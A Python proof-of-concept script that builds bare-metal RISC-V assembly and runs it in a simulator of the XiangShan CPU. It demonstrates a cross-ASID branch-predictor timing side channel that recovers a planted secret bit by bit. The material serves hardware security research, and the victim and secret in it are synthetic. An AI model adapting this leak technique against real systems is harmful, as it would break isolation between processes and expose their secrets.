#!/usr/bin/env python3
"""Leak victim branch-condition bits through cross-ASID BPU state on XiangShan.

The victim's secret controls the direction of a branch at VA_BRANCH under ASID B.
The attacker under ASID A runs the same virtual branch with a known not-taken
input and compares its timing with an untrained control branch.  A taken-trained
victim branch creates a measurable penalty in the attacker and decodes as bit 1.
"""

from __future__ import annotations

import argparse
import datetime as dt
import os
import pathlib
import shlex
import subprocess
import sys


DEFAULT_CONTAINER_BASE = pathlib.PurePosixPath(os.environ.get("XS_CONTAINER_BASE", "/cascade-mountdir"))
DEFAULT_CONTAINER = os.environ.get("XS_DOCKER_CONTAINER", "codex_cascade_cpu_fuzzing")
DEFAULT_RUNNER = os.environ.get("XS_RUNNER", "")
DEFAULT_DOCKER_RUNNER = os.environ.get("XS_DOCKER_RUNNER", "")

LINKER_SCRIPT = """\
ENTRY(_start)
PHDRS
{
  all PT_LOAD FLAGS(7);
}
SECTIONS
{
  . = 0x80000000;
  .text : { *(.text.init) *(.text*) } :all
  .rodata : { *(.rodata*) } :all
  .data : { *(.data*) } :all
  .bss : { *(.bss*) *(COMMON) } :all
}
"""

ASM = r"""\
.option norvc

.equ STOP_MMIO,      0x60000000
.equ VA_BRANCH,      0x40000000
.equ VA_CTRL,        0x40001000
.equ VA_SECRET_BIT,  0x40004000
.equ TRAIN_ITERS,    __TRAIN_ITERS__
.equ THRESHOLD,      __THRESHOLD__
.equ PTE_V,          0x001
.equ PTE_R,          0x002
.equ PTE_W,          0x004
.equ PTE_X,          0x008
.equ PTE_A,          0x040
.equ PTE_D,          0x080
.equ PTE_TABLE,      PTE_V
.equ PTE_CODE,       (PTE_V | PTE_R | PTE_X | PTE_A | PTE_D)
.equ PTE_DATA,       (PTE_V | PTE_R | PTE_W | PTE_A | PTE_D)
.equ SATP_MODE_SV39, (8 << 60)
.equ ASID_ATTACKER,  0x11
.equ ASID_VICTIM,    0x22

.section .text.init
.globl _start
_start:
  la sp, stack_top

  la t0, phase
  sd x0, 0(t0)
  la t0, poison_cycles
  sd x0, 0(t0)
  la t0, control_cycles
  sd x0, 0(t0)
  la t0, attacker_zero
  sd x0, 0(t0)
  la t0, victim_secret
  li t1, __SECRET_BIT__
  sd t1, 0(t0)

  li t0, 31
  csrw pmpcfg0, t0
  li t0, 1
  slli t0, t0, 54
  addi t0, t0, -1
  csrw pmpaddr0, t0
  li t0, -1
  csrw mcounteren, t0
  csrw medeleg, x0
  la t0, trap_entry
  csrw mtvec, t0

  call setup_page_tables
  j dispatch_next

setup_page_tables:
  addi sp, sp, -16
  sd ra, 8(sp)

  la t0, l1_a
  srli t0, t0, 12
  slli t0, t0, 10
  ori t0, t0, PTE_TABLE
  la t1, root_a
  sd t0, 8(t1)

  la t0, l0_a
  srli t0, t0, 12
  slli t0, t0, 10
  ori t0, t0, PTE_TABLE
  la t1, l1_a
  sd t0, 0(t1)

  la t0, l1_b
  srli t0, t0, 12
  slli t0, t0, 10
  ori t0, t0, PTE_TABLE
  la t1, root_b
  sd t0, 8(t1)

  la t0, l0_b
  srli t0, t0, 12
  slli t0, t0, 10
  ori t0, t0, PTE_TABLE
  la t1, l1_b
  sd t0, 0(t1)

  /* Attacker: same VA branch reads known zero. */
  la t0, code_branch
  li t2, PTE_CODE
  call make_pte
  la t1, l0_a
  sd t0, 0(t1)

  la t0, code_control
  li t2, PTE_CODE
  call make_pte
  la t1, l0_a
  sd t0, 8(t1)

  la t0, attacker_zero
  li t2, PTE_DATA
  call make_pte
  la t1, l0_a
  sd t0, 32(t1)

  /* Victim: same VA branch reads the secret bit. */
  la t0, code_branch
  li t2, PTE_CODE
  call make_pte
  la t1, l0_b
  sd t0, 0(t1)

  la t0, victim_secret
  li t2, PTE_DATA
  call make_pte
  la t1, l0_b
  sd t0, 32(t1)

  sfence.vma x0, x0
  ld ra, 8(sp)
  addi sp, sp, 16
  ret

make_pte:
  srli t0, t0, 12
  slli t0, t0, 10
  or t0, t0, t2
  ret

make_satp_attacker:
  li a0, SATP_MODE_SV39
  li t0, ASID_ATTACKER
  slli t0, t0, 44
  or a0, a0, t0
  la t1, root_a
  srli t1, t1, 12
  or a0, a0, t1
  ret

make_satp_victim:
  li a0, SATP_MODE_SV39
  li t0, ASID_VICTIM
  slli t0, t0, 44
  or a0, a0, t0
  la t1, root_b
  srli t1, t1, 12
  or a0, a0, t1
  ret

enter_s_va:
  csrw satp, a0
  sfence.vma x0, x0
  csrw mepc, a1
  csrr t0, mstatus
  li t1, ~(3 << 11)
  and t0, t0, t1
  li t1, (1 << 11)
  or t0, t0, t1
  csrw mstatus, t0
  mret

dispatch_next:
  la t0, phase
  ld t1, 0(t0)
  li t2, TRAIN_ITERS
  bltu t1, t2, run_victim_train
  beq t1, t2, run_attacker_probe
  addi t3, t2, 1
  beq t1, t3, run_attacker_control
  j finish_report

run_victim_train:
  call make_satp_victim
  li a1, VA_BRANCH
  j enter_s_va

run_attacker_probe:
  call make_satp_attacker
  li a1, VA_BRANCH
  j enter_s_va

run_attacker_control:
  call make_satp_attacker
  li a1, VA_CTRL
  j enter_s_va

trap_entry:
  csrr t0, mcause
  li t1, 9
  bne t0, t1, fail_loop

  la t0, phase
  ld t1, 0(t0)
  li t2, TRAIN_ITERS
  bltu t1, t2, trap_after_train
  beq t1, t2, trap_store_poison
  addi t3, t2, 1
  beq t1, t3, trap_store_control
  j fail_loop

trap_after_train:
  addi t1, t1, 1
  sd t1, 0(t0)
  j dispatch_next

trap_store_poison:
  la t4, poison_cycles
  sd a0, 0(t4)
  addi t1, t1, 1
  sd t1, 0(t0)
  j dispatch_next

trap_store_control:
  la t4, control_cycles
  sd a0, 0(t4)
  addi t1, t1, 1
  sd t1, 0(t0)
  j dispatch_next

finish_report:
  la t0, poison_cycles
  ld t1, 0(t0)
  la t0, control_cycles
  ld t2, 0(t0)
  li t3, THRESHOLD
  add t3, t2, t3
  bltu t3, t1, stop
  j fail_loop

stop:
  li t0, STOP_MMIO
  li t1, 1
  sd t1, 0(t0)
1:
  j 1b

fail_loop:
  j fail_loop

.align 12
code_branch:
  csrr a0, cycle
  li t0, VA_SECRET_BIT
  ld t1, 0(t0)
  bne t1, x0, 1f
  nop
1:
  csrr a1, cycle
  sub a0, a1, a0
  ecall

.align 12
code_control:
  csrr a0, cycle
  li t0, VA_SECRET_BIT
  ld t1, 0(t0)
  bne t1, x0, 1f
  nop
1:
  csrr a1, cycle
  sub a0, a1, a0
  ecall

.section .data
.align 12
root_a: .skip 4096
l1_a:   .skip 4096
l0_a:   .skip 4096
root_b: .skip 4096
l1_b:   .skip 4096
l0_b:   .skip 4096
.align 12
attacker_zero: .skip 4096
victim_secret: .skip 4096
.align 3
phase:          .skip 8
poison_cycles:  .skip 8
control_cycles: .skip 8
.align 12
stack: .skip 4096
stack_top:
"""


def run(cmd: list[str], timeout: int | None = None) -> subprocess.CompletedProcess[str]:
    try:
        return subprocess.run(
            cmd,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        out = exc.stdout or ""
        if isinstance(out, bytes):
            out = out.decode("utf-8", errors="replace")
        return subprocess.CompletedProcess(cmd, 124, out + f"\nTIMEOUT after {timeout}s\n")


def host_to_container(
    path: pathlib.Path,
    host_base: pathlib.Path,
    container_base: pathlib.PurePosixPath,
) -> pathlib.PurePosixPath:
    return container_base.joinpath(*path.resolve().relative_to(host_base.resolve()).parts)


def secret_input_to_bits(args: argparse.Namespace) -> tuple[str, bytes | None]:
    provided = [bool(args.secret_bits), bool(args.secret_hex), bool(args.secret_text)]
    if sum(provided) != 1:
        raise SystemExit("provide exactly one of --secret-bits, --secret-hex, or --secret-text")

    if args.secret_bits:
        if any(ch not in "01" for ch in args.secret_bits):
            raise SystemExit("--secret-bits must contain only 0/1 bits")
        return args.secret_bits, None

    if args.secret_hex:
        hex_text = args.secret_hex.replace(" ", "").replace("_", "")
        if hex_text.startswith(("0x", "0X")):
            hex_text = hex_text[2:]
        if len(hex_text) % 2:
            hex_text = "0" + hex_text
        try:
            data = bytes.fromhex(hex_text)
        except ValueError as exc:
            raise SystemExit(f"invalid --secret-hex: {exc}") from exc
        return "".join(f"{byte:08b}" for byte in data), data

    data = args.secret_text.encode("utf-8")
    return "".join(f"{byte:08b}" for byte in data), data


def bits_to_bytes(bits: str) -> bytes | None:
    if len(bits) % 8 != 0 or any(ch not in "01" for ch in bits):
        return None
    return bytes(int(bits[idx : idx + 8], 2) for idx in range(0, len(bits), 8))


def build_and_run_case(
    out_dir: pathlib.Path,
    bit_index: int,
    repetition: int,
    secret_bit: str,
    train_iters: int,
    threshold: int,
    simlen: int,
    timeout: int,
    runner: pathlib.PurePosixPath | pathlib.Path,
    use_docker: bool,
    host_base: pathlib.Path,
    container_base: pathlib.PurePosixPath,
    container: str,
) -> tuple[str, int, int, pathlib.Path]:
    src_dir = out_dir / "src"
    build_dir = out_dir / "build"
    log_dir = out_dir / "logs"
    for path in (src_dir, build_dir, log_dir):
        path.mkdir(parents=True, exist_ok=True)

    ld_path = src_dir / "link.ld"
    ld_path.write_text(LINKER_SCRIPT, encoding="utf-8")
    case_name = f"secret_{bit_index}_r{repetition}_{secret_bit}"
    asm_path = src_dir / f"{case_name}.S"
    elf_path = build_dir / f"{case_name}.elf"
    dump_path = build_dir / f"{case_name}.dump"
    log_path = log_dir / f"{case_name}.log"

    asm_text = (
        ASM.replace("__TRAIN_ITERS__", str(train_iters))
        .replace("__THRESHOLD__", str(threshold))
        .replace("__SECRET_BIT__", secret_bit)
    )
    asm_path.write_text(asm_text, encoding="utf-8")

    if use_docker:
        c_ld = host_to_container(ld_path, host_base, container_base)
        c_asm = host_to_container(asm_path, host_base, container_base)
        c_elf = host_to_container(elf_path, host_base, container_base)
        c_dump = host_to_container(dump_path, host_base, container_base)
        build_inner = (
            "source /cascade-meta/env.sh >/dev/null 2>&1 || true; "
            "riscv64-unknown-elf-gcc -nostdlib -nostartfiles -march=rv64gc -mabi=lp64d "
            f"-T {shlex.quote(str(c_ld))} -o {shlex.quote(str(c_elf))} {shlex.quote(str(c_asm))} && "
            f"riscv64-unknown-elf-objdump -d -M no-aliases,numeric {shlex.quote(str(c_elf))} "
            f"> {shlex.quote(str(c_dump))}"
        )
        built = run(["docker", "exec", container, "bash", "-lc", build_inner], timeout=120)
        sim_elf = c_elf
    else:
        build_inner = (
            "riscv64-unknown-elf-gcc -nostdlib -nostartfiles -march=rv64gc -mabi=lp64d "
            f"-T {shlex.quote(str(ld_path))} -o {shlex.quote(str(elf_path))} {shlex.quote(str(asm_path))} && "
            f"riscv64-unknown-elf-objdump -d -M no-aliases,numeric {shlex.quote(str(elf_path))} "
            f"> {shlex.quote(str(dump_path))}"
        )
        built = run(["bash", "-lc", build_inner], timeout=120)
        sim_elf = elf_path
    if built.returncode:
        log_path.write_text(built.stdout, encoding="utf-8")
        return "build_fail", 0, 0, log_path

    sim_inner = (
        f"SIMLEN={simlen} "
        f"SIMSRAMELF={shlex.quote(str(sim_elf))} "
        f"TRACEFILE=/tmp/{case_name}.vcd "
        f"{shlex.quote(str(runner))}"
    )
    if use_docker:
        result = run(["docker", "exec", container, "bash", "-lc", sim_inner], timeout=timeout)
    else:
        result = run(["bash", "-lc", sim_inner], timeout=timeout)
    log_path.write_text(result.stdout, encoding="utf-8")
    found_stop = int("Found a stop request" in result.stdout)
    reached_simlen = int("Reached SIMLEN" in result.stdout)
    decoded = "1" if found_stop else "0"
    if result.returncode == 124 and not reached_simlen:
        decoded = "timeout"
    return decoded, found_stop, reached_simlen, log_path


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--secret-bits", default="")
    parser.add_argument("--secret-hex", default="")
    parser.add_argument("--secret-text", default="")
    parser.add_argument("--threshold", type=int, default=10)
    parser.add_argument("--train-iters", type=int, default=32)
    parser.add_argument("--repetitions", type=int, default=1)
    parser.add_argument("--simlen", type=int, default=60000)
    parser.add_argument("--timeout", type=int, default=420)
    parser.add_argument("--out-dir", default="")
    parser.add_argument("--runner", default=DEFAULT_RUNNER)
    parser.add_argument("--use-docker", action="store_true")
    parser.add_argument("--host-base", default=os.environ.get("XS_HOST_BASE", ""))
    parser.add_argument("--container-base", default=str(DEFAULT_CONTAINER_BASE))
    parser.add_argument("--container", default=DEFAULT_CONTAINER)
    args = parser.parse_args()

    secret_bits, secret_bytes = secret_input_to_bits(args)
    if args.repetitions < 1 or args.repetitions % 2 == 0:
        raise SystemExit("--repetitions must be a positive odd integer")
    if not args.runner:
        if args.use_docker and DEFAULT_DOCKER_RUNNER:
            args.runner = DEFAULT_DOCKER_RUNNER
        else:
            raise SystemExit("provide --runner or set XS_RUNNER")
    runner = pathlib.PurePosixPath(args.runner) if args.use_docker else pathlib.Path(args.runner)
    host_base = pathlib.Path(args.host_base).resolve() if args.host_base else pathlib.Path.cwd().resolve()
    container_base = pathlib.PurePosixPath(args.container_base)

    stamp = dt.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = pathlib.Path(args.out_dir) if args.out_dir else pathlib.Path("runs") / f"secret_branch_leak_{stamp}"
    out_dir = out_dir.resolve()
    if args.use_docker:
        try:
            out_dir.relative_to(host_base)
        except ValueError as exc:
            raise SystemExit("--out-dir must be under --host-base when --use-docker is set") from exc
    out_dir.mkdir(parents=True, exist_ok=True)
    print(f"OUT_DIR={out_dir}", flush=True)
    print(f"SECRET_BITS={secret_bits}", flush=True)
    if secret_bytes is not None:
        print(f"SECRET_HEX={secret_bytes.hex()}", flush=True)

    rows = ["idx\trepetition\tsecret\tdecoded\tfound_stop\treached_simlen\tlog\n"]
    decoded_bits: list[str] = []
    for idx, bit in enumerate(secret_bits):
        bit_decodes: list[str] = []
        for rep in range(args.repetitions):
            decoded, found_stop, reached_simlen, log_path = build_and_run_case(
                out_dir,
                idx,
                rep,
                bit,
                args.train_iters,
                args.threshold,
                args.simlen,
                args.timeout,
                runner,
                args.use_docker,
                host_base,
                container_base,
                args.container,
            )
            bit_decodes.append(decoded if decoded in "01" else "?")
            rows.append(f"{idx}\t{rep}\t{bit}\t{decoded}\t{found_stop}\t{reached_simlen}\t{log_path}\n")
        ones = bit_decodes.count("1")
        zeros = bit_decodes.count("0")
        decoded_bit = "1" if ones > zeros else "0" if zeros > ones else "?"
        decoded_bits.append(decoded_bit)
        print(
            f"RESULT idx={idx} secret={bit} votes={''.join(bit_decodes)} decoded={decoded_bit}",
            flush=True,
        )

    decoded_msg = "".join(decoded_bits)
    ok = decoded_msg == secret_bits
    summary = out_dir / "summary.tsv"
    summary.write_text("".join(rows), encoding="utf-8")
    print(f"DECODED_SECRET={decoded_msg}", flush=True)
    decoded_bytes = bits_to_bytes(decoded_msg)
    if decoded_bytes is not None:
        print(f"DECODED_HEX={decoded_bytes.hex()}", flush=True)
        print(f"DECODED_TEXT={decoded_bytes.decode('utf-8', errors='replace')}", flush=True)
    print(f"MATCH={int(ok)}", flush=True)
    print(f"SUMMARY={summary}", flush=True)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
